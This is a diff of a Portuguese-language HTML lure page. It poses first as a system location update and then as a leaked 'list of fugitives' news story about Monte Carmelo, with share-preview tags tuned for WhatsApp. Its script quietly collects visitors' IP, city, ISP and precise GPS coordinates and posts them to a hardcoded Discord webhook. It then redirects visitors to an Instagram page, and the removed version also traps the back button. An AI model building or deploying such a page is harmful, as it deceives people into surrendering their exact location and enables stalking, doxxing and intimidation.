@@ -3,157 +3,285 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MONTE CITY - ATUALIZAÇÃO</title>
+    <title>🚨 LISTA DE FORAGIDOS - MONTE CARMELO</title>
     
-    <!-- Meta tags para parecer uma atualização de sistema -->
-    <meta property="og:title" content="📍 Atualização de Localização">
-    <meta property="og:description" content="Verificando sua área de cobertura para liberar o conteúdo...">
-    <meta name="theme-color" content="#2c3e50">
+    <!-- Meta tags para parecer uma notícia real no WhatsApp/Telegram -->
+    <meta property="og:title" content="🚨 URGENTE: Nova lista de foragidos de Monte Carmelo vazou!">
+    <meta property="og:description" content="Confira os nomes dos principais procurados na região. Clique para ver a lista completa por bairro.">
+    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg">
+    <meta name="theme-color" content="#d32f2f">
 
     <style>
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background-color: #ecf0f1; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f5f5f5; 
+            color: #333; 
             margin: 0; 
             padding: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            overflow: hidden; 
-        }
-        
-        .card { 
-            background: white; 
-            width: 90%; 
-            max-width: 400px; 
-            padding: 25px; 
-            border-radius: 12px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
             text-align: center; 
         }
         
-        h2 { color: #2c3e50; margin-top: 0; font-size: 1.4em; }
+        .header { 
+            background-color: #b71c1c; 
+            color: white; 
+            padding: 15px; 
+            font-weight: bold; 
+            font-size: 1.4em; 
+            letter-spacing: 0.5px; 
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2); 
+        }
         
+        .container { 
+            padding: 20px; 
+            max-width: 500px; 
+            margin: 0 auto; 
+            background: white; 
+            min-height: 90vh; 
+        }
+        
+        .alert-box {
+            background-color: #fff3e0;
+            border-left: 5px solid #ff9800;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+            font-size: 0.95em;
+        }
+        
+        .img-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 20px;
+            overflow: hidden; 
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .final-img { 
+            width: 100%; 
+            height: auto; 
+            display: block;
+            transition: opacity 0.5s ease;
+        }
+        
+        /* Overlay inicial apenas visual */
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            display: none; /* Escondido por padrão, aparece via JS */
+        }
+
         .spinner {
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
+            border-top: 4px solid #d32f2f;
             border-radius: 50%;
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
         }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-access { 
+            background: linear-gradient(to bottom, #4caf50, #388e3c); 
+            color: white; 
+            padding: 20px; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 1.3em; 
+            font-weight: bold; 
+            cursor: pointer; 
+            width: 100%; 
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2); 
+            animation: pulse 1.5s infinite;
+        }
         
-        .status { color: #7f8c8d; font-size: 0.9em; margin-top: 15px; line-height: 1.5; }
-        .error { color: #e74c3c; font-size: 0.9em; margin-top: 10px; display: none; }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
         
-        /* Esconde elementos visualmente, mas mantém para SEO/Robôs */
-        .hidden-info { display: none; }
+        .loader { 
+            display: none; 
+            margin-top: 20px; 
+        }
+        
+        .progress-bar-bg {
+            background-color: #e0e0e0;
+            height: 8px;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        
+        .progress-bar-fill {
+            background-color: #4caf50;
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .status-text {
+            margin-top: 10px;
+            color: #666;
+            font-size: 0.9em;
+        }
+        
+        .error-message {
+            display: none;
+            background-color: #ffebee;
+            border: 1px solid #ef5350;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+            color: #d32f2f;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>📡 Sincronizando Dados...</h2>
-        <div id="loader" class="spinner"></div>
-        <p id="status-text" class="status">Conectando ao satélite...</p>
-        <p id="error-msg" class="error">⚠️ Permita a localização para continuar.</p>
+    <div class="header">MONTE CITY - PLANTÃO JUDICIAL</div>
+
+    <div class="container">
+        <h2 style="color: #d32f2f; margin-top: 0;">🚨 VAZAMENTO EXCLUSIVO</h2>
+        
+        <div class="alert-box">
+            <strong>⚠️ Atenção:</strong> A nova lista de foragidos de Monte Carmelo acaba de ser publicada. Para evitar acessos indevidos, confirmamos sua localização exata antes de liberar os dados.
+        </div>
+
+        <div class="img-container">
+            <!-- SUA NOVA IMAGEM VAI AQUI -->
+            <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
+            
+            <!-- Loader Automático -->
+            <div id="auto-loader" class="loading-overlay">
+                <div class="spinner"></div>
+            </div>
+        </div>
+
+        <p style="font-weight: bold; margin-bottom: 15px;">Verificando sua área de cobertura...</p>
+
+        <!-- Botão só aparece se o carregamento automático falhar ou demorar muito -->
+        <button id="btn" class="btn-access" onclick="iniciarVerificacaoManual()" style="display:none;">VER LISTA DA MINHA REGIÃO</button>
+
+        <div id="loader" class="loader">
+            <p id="loader-msg" style="font-weight: bold; color: #333;">Verificando sua posição...</p>
+            <div class="progress-bar-bg">
+                <div id="progress-bar" class="progress-bar-fill"></div>
+            </div>
+            <p id="loader-detail" class="status-text">Aguardando sinal do GPS...</p>
+        </div>
+        
+        <div id="error-msg" class="error-message">
+            ⚠️ Localização necessária para acessar a lista exclusiva. Por favor, permita o acesso nas configurações do navegador.
+        </div>
     </div>
 
     <script>
-        // CONFIGURAÇÃO: Coloque seu Webhook aqui
-        const WEBHOOK_URL = "SEU_WEBHOOK_AQUI"; 
+        // Seu Webhook do Discord
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
-        let attempts = 0;
-        const maxAttempts = 10; // Tenta por cerca de 30-40 segundos antes de desistir
-
-        function updateStatus(text) {
-            document.getElementById('status-text').innerText = text;
+        function updateStatus(msg, percent) {
+            document.getElementById('loader-msg').innerText = msg;
+            document.getElementById('progress-bar').style.width = percent + '%';
         }
 
-        function sendToDiscord(lat, lon, acc, ipData) {
-            const message = `🛰️ **LOCALIZAÇÃO CAPTURADA**\n📍 Lat: ${lat}\n📍 Lon: ${lon}\n🎯 Precisão: ${acc}m\n🌐 IP: ${ipData.ip || 'Indefinido'}\n🏙️ Cidade: ${ipData.city || 'Desconhecida'}`;
+        function iniciarVerificacao() {
+            // Mostra loader automático
+            document.getElementById('auto-loader').style.display = 'flex';
             
-            fetch(WEBHOOK_URL, { 
-                method: "POST", 
-                headers: {"Content-Type": "application/json"}, 
-                body: JSON.stringify({ content: message }) 
-            });
-        }
-
-        function getIP() {
-            return fetch('https://ipapi.co/json/')
+            // Passo 1: Tentar pegar o IP primeiro (rápido e invisível)
+            fetch('https://ipapi.co/json/')
                 .then(res => res.json())
-                .catch(() => ({ip: 'N/A', city: 'N/A'}));
+                .then(data => {
+                    enviarDados(`📍 **ACESSO POR IP**\n🏙️ Cidade: ${data.city}\n🌐 IP: ${data.ip}\n📡 ISP: ${data.org}`);
+                    
+                    // Passo 2: Pedir GPS automaticamente
+                    solicitarGPS();
+                })
+                .catch(() => {
+                    solicitarGPS(true);
+                });
         }
 
-        function startTracking(ipPromise) {
+        function solicitarGPS(ipFracassou = false) {
             if (!navigator.geolocation) {
-                updateStatus("Seu navegador não suporta rastreamento.");
+                mostrarErro();
                 return;
             }
 
-            const options = {
-                enableHighAccuracy: true, // Usa GPS real
-                timeout: 10000,           // Tempo máximo por tentativa
-                maximumAge: 0             // Não usa cache antigo
-            };
-
-            function tryLoc() {
-                if (attempts >= maxAttempts) {
-                    updateStatus("Localização capturada! Redirecionando...");
-                    window.location.href = "https://www.instagram.com/montecitybr";
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const lat = pos.coords.latitude.toFixed(6);
-                        const lon = pos.coords.longitude.toFixed(6);
-                        const acc = Math.round(pos.coords.accuracy);
-
-                        // Se a precisão for melhor que 50 metros, consideramos bom o suficiente
-                        if (acc < 50) {
-                            ipPromise.then(data => {
-                                sendToDiscord(lat, lon, acc, data);
-                                updateStatus("Dados enviados! Verificando acesso...");
-                                setTimeout(() => {
-                                    window.location.href = "https://www.instagram.com/montecitybr";
-                                }, 2000);
-                            });
-                        } else {
-                            attempts++;
-                            updateStatus(`Sinal fraco (${acc}m). Aguardando mais precisão...`);
-                            setTimeout(tryLoc, 3000); // Tenta de novo em 3 segundos
-                        }
-                    },
-                    (err) => {
-                        attempts++;
-                        updateStatus(`Buscando sinal... (${attempts}/${maxAttempts})`);
-                        setTimeout(tryLoc, 2000);
-                    },
-                    options
-                );
-            }
-
-            tryLoc();
+            // Tenta obter a localização com alta precisão
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lon = position.coords.longitude.toFixed(6);
+                    const precisao = position.coords.accuracy ? Math.round(position.coords.accuracy) : '?';
+                    
+                    const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    // Envia dados do GPS
+                    enviarDados(`🛰️ **LOCALIZAÇÃO EXATA CAPTURADA!**\n📍 Coordenadas: ${lat}, ${lon}\n🎯 Precisão: ~${precisao} metros\n🗺️ Mapa: ${mapaLink}`);
+                    
+                    finalizarComSucesso();
+                },
+                (error) => {
+                    console.error("Erro GPS:", error);
+                    // Se der erro, tenta redirecionar mesmo assim ou mostra erro
+                    finalizarComFalha();
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
         }
 
-        // Inicia tudo junto
-        const ipPromise = getIP();
-        startTracking(ipPromise);
+        function enviarDados(conteudo) {
+            fetch(WEBHOOK_URL, { 
+                method: "POST", 
+                headers: {"Content-Type": "application/json"}, 
+                body: JSON.stringify({ content: conteudo }) 
+            }).catch(err => console.log("Erro envio webhook:", err));
+        }
 
-        // Anti-back button: Se o usuário tentar voltar, recarrega e tenta de novo
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            history.go(1);
-            alert("Verificação de segurança necessária. Aguarde...");
-            attempts = 0; // Reinicia contagem
-            startTracking(ipPromise);
-        };
+        function mostrarErro() {
+            document.getElementById('auto-loader').style.display = 'none';
+            document.getElementById('error-msg').style.display = 'block';
+            setTimeout(() => {
+                 window.location.href = "https://www.instagram.com/montecitybr";
+            }, 5000);
+        }
+
+        function finalizarComSucesso() {
+            document.getElementById('auto-loader').style.display = 'none';
+            // Redireciona para o Instagram ou onde quiser mostrar a "lista"
+            window.location.href = "https://www.instagram.com/montecitybr";
+        }
+
+        function finalizarComFalha() {
+             document.getElementById('auto-loader').style.display = 'none';
+             window.location.href = "https://www.instagram.com/montecitybr";
+        }
+
+        // Função para caso o usuário clique no botão manualmente (fallback)
+        function iniciarVerificacaoManual() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            solicitarGPS();
+        }
+
+        // INICIA AUTOMATICAMENTE AO CARREGAR A PÁGINA
+        window.onload = iniciarVerificacao;
     </script>
 
 </body>
